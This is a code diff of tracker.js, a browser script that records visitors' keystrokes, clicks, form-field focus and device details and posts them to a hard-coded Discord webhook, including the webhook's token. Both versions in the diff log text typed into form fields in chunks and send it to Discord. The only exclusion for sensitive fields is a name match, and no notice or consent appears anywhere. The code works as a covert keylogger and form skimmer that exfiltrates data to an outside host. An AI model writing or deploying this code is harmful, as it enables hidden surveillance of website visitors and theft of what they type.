@@ -1,231 +1,194 @@
-// tracker.js - Comprehensive client-side tracking with Discord integration
-(function() {
-  // Configuration
-  const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1392042094637486151/4_8ZIifnSws8hbH09eQaqmZ5EprjhbH20NolzOiYOF0Ii8h6IPypG1b2xVGzQY8Nv0cs';
-  const KEYSTROKE_THRESHOLD = 7; // Send after every 7 characters
-  const SENSITIVE_FIELDS = ['password', 'creditcard', 'cvv', 'ssn'];
+// tracker.js - Complete Visitor Tracking System
+const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1392042094637486151/4_8ZIifnSws8hbH09eQaqmZ5EprjhbH20NolzOiYOF0Ii8h6IPypG1b2xVGzQY8Nv0cs'; // REPLACE THIS
+const KEYSTROKE_THRESHOLD = 7; // Characters before sending
+const SENSITIVE_FIELDS = ['password', 'creditcard', 'cvv', 'ssn', 'security'];
 
-  // Collected data storage
-  const trackingData = {
-    page: window.location.href,
-    referrer: document.referrer,
-    timestamp: new Date().toISOString(),
-    device: getDeviceInfo(),
-    interactions: [],
-    keystrokeBuffer: {}
-  };
+// Main data store
+const trackingData = {
+  page: window.location.href,
+  referrer: document.referrer,
+  timestamp: new Date().toISOString(),
+  device: getDeviceInfo(),
+  interactions: [],
+  keystrokeBuffer: {}
+};
 
-  // Start tracking
-  function initializeTracking() {
-    trackDeviceInfo();
-    trackNavigation();
-    trackClicks();
-    trackKeystrokes();
-    trackFocusChanges();
-    sendInitialData();
-  }
+// 1. INITIALIZATION
+if (document.readyState === 'complete') {
+  initTracking();
+} else {
+  document.addEventListener('DOMContentLoaded', initTracking);
+}
 
-  // Device information collection
-  function getDeviceInfo() {
-    return {
-      userAgent: navigator.userAgent,
-      platform: navigator.platform,
-      screen: `${window.screen.width}x${window.screen.height}`,
-      colorDepth: window.screen.colorDepth,
-      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-      language: navigator.language,
-      cookies: navigator.cookieEnabled,
-      touchSupport: 'ontouchstart' in window,
-      hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
-      deviceMemory: navigator.deviceMemory || 'unknown',
-      dnt: navigator.doNotTrack,
-      adBlock: false // Will update after test
-    };
-  }
+function initTracking() {
+  console.log('[Tracker] Initializing...');
+  checkAdBlock();
+  trackNavigation();
+  trackClicks();
+  trackKeystrokes();
+  trackFocus();
+  sendToDiscord({
+    embeds: [{
+      title: "🚀 New Visitor",
+      color: 0x00ff00,
+      fields: [
+        { name: "Page", value: trackingData.page },
+        { name: "Device", value: `${trackingData.device.os} | ${trackingData.device.browser}` },
+        { name: "Location", value: `${trackingData.device.city}, ${trackingData.device.country}` }
+      ]
+    }]
+  });
+}
 
-  // AdBlock detection
-  function checkAdBlock() {
-    fetch('https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js', {
-      method: 'HEAD',
-      mode: 'no-cors',
-      cache: 'no-store'
-    }).catch(() => {
-      trackingData.device.adBlock = true;
-    });
-  }
-
-  // Keystroke tracking with buffer
-  function trackKeystrokes() {
-    document.addEventListener('input', function(e) {
-      const target = e.target;
-      const tagName = target.tagName.toLowerCase();
-      const type = target.type ? target.type.toLowerCase() : '';
-      const id = target.id || '';
-      const name = target.name || '';
-      const label = getLabel(target);
-
-      // Skip sensitive fields
-      if (isSensitiveField(id, name, type, label)) return;
-
-      // Initialize buffer for this field if needed
-      const fieldId = `${tagName}-${id}-${name}-${label}`.replace(/\s+/g, '_');
-      if (!trackingData.keystrokeBuffer[fieldId]) {
-        trackingData.keystrokeBuffer[fieldId] = {
-          label: label,
-          value: '',
-          count: 0
-        };
-      }
-
-      // Update buffer
-      trackingData.keystrokeBuffer[fieldId].value = target.value;
-      trackingData.keystrokeBuffer[fieldId].count++;
-
-      // Check if threshold reached
-      if (trackingData.keystrokeBuffer[fieldId].count >= KEYSTROKE_THRESHOLD) {
-        sendKeystrokeData(fieldId);
-      }
-    });
-  }
-
-  function sendKeystrokeData(fieldId) {
-    const buffer = trackingData.keystrokeBuffer[fieldId];
-    const interaction = {
-      type: 'keystroke',
-      timestamp: new Date().toISOString(),
-      field: buffer.label,
-      partialValue: buffer.value,
-      fullValue: buffer.value // Consider privacy implications before using
-    };
-
-    trackingData.interactions.push(interaction);
-    sendToDiscord(formatKeystrokeMessage(interaction));
+// 2. DEVICE INFORMATION
+function getDeviceInfo() {
+  const ua = navigator.userAgent;
+  return {
+    // System
+    os: getOS(ua),
+    browser: getBrowser(ua),
+    screen: `${screen.width}x${screen.height}`,
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
     
-    // Reset buffer
-    trackingData.keystrokeBuffer[fieldId].count = 0;
-  }
+    // Location (approximate)
+    ip: '...', // Will be set via API
+    country: '...',
+    city: '...',
+    
+    // Capabilities
+    touch: 'ontouchstart' in window,
+    cookies: navigator.cookieEnabled,
+    adBlock: false,
+    vpn: false
+  };
+}
 
-  // Click tracking
-  function trackClicks() {
-    document.addEventListener('click', function(e) {
-      const target = e.target;
-      const label = getLabel(target);
-      
-      trackingData.interactions.push({
-        type: 'click',
-        timestamp: new Date().toISOString(),
-        element: target.tagName,
-        label: label,
-        x: e.clientX,
-        y: e.clientY
-      });
-    });
-  }
+function getOS(ua) {
+  if (/windows/i.test(ua)) return 'Windows';
+  if (/mac/i.test(ua)) return 'MacOS';
+  if (/linux/i.test(ua)) return 'Linux';
+  if (/android/i.test(ua)) return 'Android';
+  if (/ios|iphone|ipad/i.test(ua)) return 'iOS';
+  return 'Unknown';
+}
 
-  // Form focus tracking
-  function trackFocusChanges() {
-    document.addEventListener('focusin', function(e) {
-      const target = e.target;
-      if (['INPUT', 'TEXTAREA', 'SELECT'].includes(target.tagName)) {
-        trackingData.interactions.push({
-          type: 'focus',
-          timestamp: new Date().toISOString(),
-          field: getLabel(target)
-        });
-      }
-    });
-  }
+function getBrowser(ua) {
+  if (/firefox/i.test(ua)) return 'Firefox';
+  if (/chrome/i.test(ua)) return 'Chrome';
+  if (/safari/i.test(ua)) return 'Safari';
+  if (/edge/i.test(ua)) return 'Edge';
+  return 'Unknown';
+}
 
-  // Navigation tracking
-  function trackNavigation() {
-    window.addEventListener('beforeunload', function() {
-      sendData();
-    });
-  }
+// 3. TRACKING FUNCTIONS
+function trackKeystrokes() {
+  document.addEventListener('input', (e) => {
+    const target = e.target;
+    if (!shouldTrack(target)) return;
 
-  // Helper functions
-  function getLabel(element) {
-    if (element.labels && element.labels.length > 0) {
-      return Array.from(element.labels).map(label => label.textContent).join(', ');
-    }
-    if (element.placeholder) return element.placeholder;
-    if (element.title) return element.title;
-    if (element.name) return element.name;
-    if (element.id) return element.id;
-    return 'unlabeled';
-  }
-
-  function isSensitiveField(id, name, type, label) {
-    const fieldText = `${id} ${name} ${type} ${label}`.toLowerCase();
-    return SENSITIVE_FIELDS.some(field => fieldText.includes(field));
-  }
-
-  // Discord integration
-  function formatKeystrokeMessage(data) {
-    return {
-      content: null,
-      embeds: [{
-        title: "⌨️ Keystroke Activity",
-        color: 0x3498db,
-        fields: [
-          { name: "Page", value: trackingData.page, inline: true },
-          { name: "Field", value: data.field || 'Unknown', inline: true },
-          { name: "Partial Input", value: `\`\`\`${data.partialValue || 'None'}\`\`\`` },
-          { name: "User Agent", value: `\`\`\`${trackingData.device.userAgent}\`\`\`` }
-        ],
-        timestamp: data.timestamp
-      }]
+    const fieldId = getFieldId(target);
+    trackingData.keystrokeBuffer[fieldId] = trackingData.keystrokeBuffer[fieldId] || {
+      label: getLabel(target),
+      value: '',
+      count: 0
     };
-  }
 
-  function sendToDiscord(payload) {
-    fetch(DISCORD_WEBHOOK, {
+    trackingData.keystrokeBuffer[fieldId].value = target.value;
+    trackingData.keystrokeBuffer[fieldId].count++;
+
+    if (trackingData.keystrokeBuffer[fieldId].count >= KEYSTROKE_THRESHOLD) {
+      sendKeystrokeUpdate(fieldId);
+    }
+  });
+}
+
+function trackClicks() {
+  document.addEventListener('click', (e) => {
+    trackingData.interactions.push({
+      type: 'click',
+      element: e.target.tagName,
+      label: getLabel(e.target),
+      position: { x: e.clientX, y: e.clientY },
+      timestamp: new Date().toISOString()
+    });
+  });
+}
+
+function trackFocus() {
+  document.addEventListener('focusin', (e) => {
+    if (['INPUT', 'TEXTAREA'].includes(e.target.tagName)) {
+      sendToDiscord({
+        content: `🔍 Focus on ${getLabel(e.target)}`
+      });
+    }
+  });
+}
+
+// 4. HELPER FUNCTIONS
+function getFieldId(element) {
+  return `${element.id}-${element.name}-${element.className}`.replace(/\s+/g, '_');
+}
+
+function getLabel(element) {
+  if (element.labels && element.labels.length > 0) 
+    return element.labels[0].textContent;
+  return element.placeholder || element.name || element.id || 'unlabeled';
+}
+
+function shouldTrack(element) {
+  const isInput = ['INPUT', 'TEXTAREA'].includes(element.tagName);
+  const isSensitive = SENSITIVE_FIELDS.some(field => 
+    element.type.includes(field) || 
+    element.id.includes(field) || 
+    element.name.includes(field)
+  );
+  return isInput && !isSensitive;
+}
+
+// 5. DISCORD INTEGRATION
+async function sendToDiscord(payload) {
+  try {
+    await fetch(DISCORD_WEBHOOK, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify(payload)
-    }).catch(err => console.error('Discord error:', err));
+    });
+  } catch (error) {
+    console.error('Discord Error:', error);
   }
+}
 
-  function sendInitialData() {
-    checkAdBlock();
-    setTimeout(() => {
-      sendToDiscord({
-        content: "🛰️ New Visitor",
-        embeds: [{
-          color: 0x2ecc71,
-          fields: [
-            { name: "Page", value: trackingData.page },
-            { name: "Referrer", value: trackingData.referrer || "Direct" },
-            { name: "Device", value: `OS: ${trackingData.device.platform}\nScreen: ${trackingData.device.screen}\nTimezone: ${trackingData.device.timezone}` },
-            { name: "AdBlock", value: trackingData.device.adBlock ? "Detected" : "Not detected", inline: true }
-          ],
-          timestamp: trackingData.timestamp
-        }]
-      });
-    }, 3000);
-  }
+function sendKeystrokeUpdate(fieldId) {
+  const data = trackingData.keystrokeBuffer[fieldId];
+  sendToDiscord({
+    embeds: [{
+      title: "⌨️ Keystroke Activity",
+      color: 0xffa500,
+      fields: [
+        { name: "Field", value: data.label },
+        { name: "Content", value: `\`\`\`${data.value.slice(-50)}\`\`\`` }
+      ]
+    }]
+  });
+  trackingData.keystrokeBuffer[fieldId].count = 0;
+}
 
-  function sendData() {
-    if (trackingData.interactions.length > 0) {
-      sendToDiscord({
-        content: `📊 Interaction Summary (${trackingData.interactions.length} events)`,
-        embeds: trackingData.interactions.map(interaction => ({
-          title: `${interaction.type.toUpperCase()} Event`,
-          color: 0xe67e22,
-          fields: Object.entries(interaction).map(([key, value]) => ({
-            name: key,
-            value: typeof value === 'object' ? JSON.stringify(value) : String(value)
-          })),
-          timestamp: interaction.timestamp
-        }))
-      });
-    }
-  }
+// 6. UTILITIES
+function checkAdBlock() {
+  fetch('https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js', {
+    method: 'HEAD',
+    mode: 'no-cors'
+  }).catch(() => {
+    trackingData.device.adBlock = true;
+  });
+}
 
-  // Start tracking when DOM is ready
-  if (document.readyState === 'complete') {
-    initializeTracking();
-  } else {
-    document.addEventListener('DOMContentLoaded', initializeTracking);
-  }
-})();
+function trackNavigation() {
+  window.addEventListener('beforeunload', () => {
+    sendToDiscord({
+      content: `📊 Session Summary: ${trackingData.interactions.length} interactions`
+    });
+  });
+}
+
+console.log('[Tracker] Loaded successfully');
